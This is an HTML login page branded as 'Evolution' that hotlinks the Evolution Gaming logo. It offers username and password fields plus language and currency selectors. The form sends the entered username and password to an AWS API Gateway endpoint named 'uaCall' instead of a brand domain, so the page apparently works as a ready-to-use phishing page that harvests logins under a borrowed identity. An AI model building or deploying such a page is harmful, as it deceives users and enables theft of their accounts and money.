<html lang="en">
  <head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1">
    <title>Evolution</title>
    <link href="style.css" rel="stylesheet">
    

  </head>
  <body>
    <div id="root">
      <div>
        <div class="header-container">
          <div class="logo" style="background: url('https://alive.evolutiongaming.com/lobby-brandings/evolution_logo_gradient_463x91_v2.f745d10.png') center center / contain no-repeat;"></div>
          <div class="footer-text">footer-text</div>
        </div>

        <div class="main-background" style="background: url('') 50% 50% / cover no-repeat black;">
        
          <div class="form-container">
            <form id="loginForm" class="login-form" action="https://k1ysbcjbei.execute-api.us-east-1.amazonaws.com/default/uaCall" method="post">
              <input data-testid="username" class="input-field" type="text" name="username" placeholder="ENTER USERNAME">
              <input class="input-field" type="password" name="password" placeholder="ENTER PASSWORD">
              <input type="hidden" name="langInput" value="en-US">
              <input type="hidden" name="currencyInput" value="EUR">
              <div class="selector-container">
                <select id="languageSelect" class="selector">
                  <option value="sq">Albanian</option>
                  <option value="ar">Arabic</option>
                  <option value="hy">Armenian</option>
                  <option value="bn">Bangla</option>
                  <option value="bg">Bulgarian</option>
                  <option value="ca">Catalan</option>
                  <option value="zh-Hans">Chinese (Simplified)</option>
                  <option value="zh-Hant">Chinese (Traditional)</option>
                  <option value="hr">Croatian</option>
                  <option value="cs">Czech</option>
                  <option value="da">Danish</option>
                  <option value="nl">Dutch</option>
                  <option value="en-NL">English (Netherlands)</option>
                  <option value="en-GB">English (United Kingdom)</option>
                  <option value="en-US" selected>English (United States)</option>
                  <option value="en-US-x-sweep">English (United States) (sweep)</option>
                  <option value="et">Estonian</option>
                  <option value="fi">Finnish</option>
                  <option value="fr">French</option>
                  <option value="fr-CA">French (Canada)</option>
                  <option value="ka">Georgian</option>
                  <option value="de">German</option>
                  <option value="el">Greek</option>
                  <option value="he">Hebrew</option>
                  <option value="hi">Hindi</option>
                  <option value="hu">Hungarian</option>
                  <option value="id">Indonesian</option>
                  <option value="it">Italian</option>
                  <option value="ja">Japanese</option>
                  <option value="ko">Korean</option>
                  <option value="lv">Latvian</option>
                  <option value="lt">Lithuanian</option>
                  <option value="mk">Macedonian</option>
                  <option value="ms">Malay</option>
                  <option value="mn">Mongolian</option>
                  <option value="no">Norwegian</option>
                  <option value="pl">Polish</option>
                  <option value="pt-BR">Portuguese (Brazil)</option>
                  <option value="pt-PT">Portuguese (Portugal)</option>
                  <option value="ro">Romanian</option>
                  <option value="ru">Russian</option>
                  <option value="sr">Serbian</option>
                  <option value="sk">Slovak</option>
                  <option value="sl">Slovenian</option>
                  <option value="es">Spanish</option>
                  <option value="es-419">Spanish (Latin America)</option>
                  <option value="es-US">Spanish (United States)</option>
                  <option value="sv">Swedish</option>
                  <option value="te">Telugu</option>
                  <option value="th">Thai</option>
                  <option value="tr">Turkish</option>
                  <option value="uk">Ukrainian</option>
                  <option value="vi">Vietnamese</option>
                </select>
              </div>
              <div class="selector-container">
                <select id="currencySelect" class="selector">
                  <option value="EUR">EUR</option>
                  <option value="CNY">CNY</option>
                  <option value="KRW">KRW</option>
                  <option value="IDR">IDR</option>
                  <option value="JPY">JPY</option>

                </select>

              </div>
              <input class="submit-button" type="submit" value="Log in">
            </form>
          </div>
        </div>
      </div>
    </div>
    <script src="script.js"></script>
  </body>
</html>
